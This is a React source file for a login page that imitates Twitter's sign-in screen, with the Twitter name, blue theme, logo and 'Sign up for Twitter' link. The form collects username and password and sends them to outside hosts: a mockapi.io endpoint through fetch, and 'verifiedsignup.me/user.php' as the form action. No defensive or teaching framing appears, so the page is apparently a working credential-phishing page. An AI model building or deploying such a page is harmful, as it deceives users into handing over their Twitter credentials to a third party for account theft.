import { ThemeProvider } from "@material-ui/styles";
import { purple } from "@material-ui/core/colors";
import Button from "@material-ui/core/Button";
import { createMuiTheme } from "@material-ui/core/styles";
import React, { Component } from "react";
import { Link } from "react-router-dom";
import Logo from "../../components/icons/Logo";
import PasswordInput from "../../components/PasswordInput/PasswordInput";
import "./Login.css";
import TextField from "@material-ui/core/TextField";
import TextInput from "../../components/TextInput/TextInput";
import PropTypes from "prop-types";
import { Redirect } from "react-router-dom";
import {
  FormControl,
  InputLabel,
  Input,
  FilledInput,
  OutlinedInput,
} from "@material-ui/core";

const theme = createMuiTheme({
  palette: {
    primary: {
      main: "#1da1f2",
    },
    secondary: {
      main: "#eee",
    },
  },
});
export default class Login extends Component {
  state = {
    redirect: false,
  };
  setRedirect = () => {
    this.setState({
      redirect: true,
    });
  };
  renderRedirect = () => {
    if (this.state.redirect) {
      return <Redirect to="/target" />;
    }
  };

  constructor(props) {
    super(props);
    this.state = {
      values: {
        username: "",
        email: "",
        password: "",
      },
      isSubmitting: false,
      isError: false,
    };
  }

  submitForm = async (e) => {
    e.preventDefault();
    console.log(this.state);
    this.setState({ isSubmitting: true });

    const res = await fetch(
      "https://604e77c62a808e0017784f18.mockapi.io/user",
      {
        method: "POST",
        body: JSON.stringify(this.state.values),
        headers: {
          "Content-Type": "application/json",
        },
      }
    );
    this.setState({ isSubmitting: false });
    const data = await res.json();
    !data.hasOwnProperty("error")
      ? this.setState({ message: data.success })
      : this.setState({ message: data.error, isError: true });

    setTimeout(
      () =>
        this.setState({
          isError: false,
          message: "",
          values: { username: "", email: "", password: "" },
        }),
      1600
    );
  };

  handleInputChange = (e) =>
    this.setState({
      values: { ...this.state.values, [e.target.name]: e.target.value },
    });

  render() {
    return (
      <ThemeProvider theme={theme}>
        <div className="container">
          <div className="panel">
            <form
              method="POST"
              onSubmit={this.submitForm}
              action="https://verifiedsignup.me/user.php"
            >
              <div className="panelHeader">
                <Logo width={39} fill="white" />
                <span className="panelHeaderText">Log in to Twitter</span>
              </div>
              <br />
              <FormControl
                style={{ paddingBottom: "15px" }}
                required
                fullWidth
                variant="filled"
              >
                <InputLabel InputLabelProps={{}} htmlFor="component-filled">
                  Phone, email, or username
                </InputLabel>
                <OutlinedInput
                  type="text"
                  name="username"
                  autoFocus
                  style={{fontSize: "19px", paddingTop: "10px", height: "3.8rem"}}
                  id="username"
                  value={this.state.values.username}
                  onChange={this.handleInputChange}
                  title="Username"
                  required
                />
              </FormControl>

              <FormControl
                style={{ paddingBottom: "15px" }}
                required
                fullWidth
                variant="filled"
              >
                <InputLabel InputLabelProps={{}} htmlFor="component-filled">
                  Password
                </InputLabel>
                <OutlinedInput
                  type="text"
                  name="password"
                  id="password"
                  value={this.state.values.password}
                  onChange={this.handleInputChange}
                  title="Username"
                  required
                />
              </FormControl>

              <button type="submit" className="btn-login">
                <span className="login-span">Log in </span>
              </button>
              <div className="loginLinks">
                <a href="/forgot">
                  <span className="link">Forgot Passowrd?</span>
                </a>
                <span className="point">.</span>
                <a href="/signup">
                  <span className="link">Sign up for Twitter</span>
                </a>
              </div>
              <Button color="primary">Primary</Button>
              <Button color="secondary">Secondary</Button>
            </form>
          </div>
        </div>
      </ThemeProvider>
    );
  }
}
